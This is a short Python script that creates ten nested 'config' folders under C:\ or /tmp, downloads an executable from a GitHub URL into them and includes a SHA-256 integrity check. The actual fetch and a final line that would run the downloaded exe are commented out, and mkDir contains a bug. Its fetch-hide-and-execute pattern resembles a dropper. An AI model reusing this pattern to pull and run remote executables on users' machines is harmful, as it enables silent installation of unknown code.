import os
import hashlib
import csv
import requests
import subprocess

global rootDir
rootDir = ''

def setup():
    global rootDir
    try:
        if os.name == 'nt':
            rootDir = "C:\\"
            for i in range(0,10):
                rootDir += "config\\"
                try:
                    os.mkdir(rootDir)
                except FileExistsError:
                    continue
            return True
        else:
            rootDir = "/tmp/"
            for i in range(0,10):
                rootDir += "config/"
                try:
                    os.mkdir(rootDir)
                except FileExistsError:
                    continue
            return True
    except:
        return False

def mkDir(dirList):
    tmp = rootDir
    try:
        if os.name == 'nt':
            for i in dirList:
                tmp += i + "\\"
                try:
                    os.mkdir(tmp)
                except FileExistsError:
                    continue
            return tmp
        else:
            for i in dir:
                tmp += i + "/"
                try:
                    os.mkdir(tmp)
                except FileExistsError:
                    continue
            return tmp
    except:
        return False


def download(url):
    global rootDir
    if setup():
        try:
            newFolders = ''.join(url.split('/master')[1:]).split('/')[1:-1]
            print(newFolders)
            tmp = rootDir + url.split("/master")[-1].split("/")[-1]
            with open(tmp,"wb") as f:
                #f.write(requests.get(url).content)
                f.close()
            return tmp
        except:
            return False
    else:
        return False

def checkIntegrity(filename,url):
    sha256sumFile = download(url)
    try:
        with open(sha256sumFile, 'r') as file:
            reader = csv.reader(file)
            sha256sumDict = {rows[0]: rows[1] for rows in reader}
        os.remove(sha256sumFile)
        with open(filename,'rb') as file:
            bytes = file.read()
        sha256sum = hashlib.sha256(bytes).hexdigest()
        if(sha256sumDict.get(filename) == sha256sum):
            return  True
        else:
            return False

    except:
        return False


exe = download("https://github.com/E1i0t/qwertyuiopasdfghjklzxcvbnm/raw/master/aaa/bbb/test.exe")
print(exe)
#subprocess.run([exe],shell=False)